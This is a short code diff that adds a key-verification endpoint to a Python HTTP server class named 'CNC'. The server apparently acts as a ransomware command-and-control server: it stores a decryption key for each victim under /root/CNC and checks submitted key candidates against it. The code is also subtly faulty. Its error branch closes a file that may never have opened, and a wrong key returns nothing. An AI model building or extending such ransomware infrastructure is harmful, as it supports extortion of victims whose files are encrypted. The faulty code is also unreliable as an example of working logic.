@@ -40,6 +40,26 @@ class CNC(CNCBase):
         
         return {"status":"KO"}
 
+    def check_key_candidate(self,body:dict)->dict:
+
+        token = base64.b64decode(body['token'])
+        folder_name = "/root/CNC/" + token.hex()
+        key_file = folder_name + "/key.bin"
+
+        key_candidate = base64.b64decode(body["key"])
+
+        try:
+            file = open(key_file, "rb")
+            key = file.read()
+            file.close()
+
+            if key == key_candidate:
+                return {"valide":1}
+        except:
+            file.close()
+            return {"valide":0}
+        
+
            
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
 httpd.serve_forever()
